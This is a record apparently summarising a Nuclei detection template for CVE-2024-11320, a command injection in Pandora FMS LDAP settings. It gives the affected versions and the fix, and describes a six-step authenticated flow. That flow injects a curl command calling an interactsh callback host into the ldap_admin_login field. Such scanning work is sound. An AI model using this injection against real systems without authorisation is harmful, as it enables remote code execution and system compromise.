---
cve_id: CVE-2024-11320
template_path: nuclei-templates/http/cves/2024/CVE-2024-11320.yaml
affected_product: Pandora FMS
severity: critical
authentication: required
external_callback: true
affected_versions: 700 through <=777.4
preconditions: administrator privileges (godmode/setup access)
poc_classification: rce
---

## Vulnerability
Pandora FMS is affected by a command injection vulnerability (CWE-77) in the LDAP authentication mechanism. Versions from 700 through <=777.4 are vulnerable. Authenticated administrators can inject arbitrary OS commands via the `ldap_admin_login` parameter when updating authentication settings, leading to remote code execution and full system compromise (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H score 9.8). Impact: complete system compromise. Remediation: upgrade to 777.5 or later.

## PoC / Detection
Classification: rce

The template executes a 6-step authenticated flow: (1) GET login page and extract CSRF token via regex; (2) POST username/password to establish PHPSESSID session (verify 302); (3) GET logged-in health page; (4) GET LDAP setup page (`sec=general&sec2=godmode/setup/setup&section=auth`) and extract second CSRF; (5) POST malicious config update enabling LDAP and injecting `';curl xxxxzz.{{interactsh-url}} #` into `ldap_admin_login`; (6) final GET login page (cookies disabled) that triggers and confirms RCE via DNS interaction on interactsh.

## References
- https://github.com/mhaskar/CVE-2024-11320
- https://nvd.nist.gov/vuln/detail/CVE-2024-11320
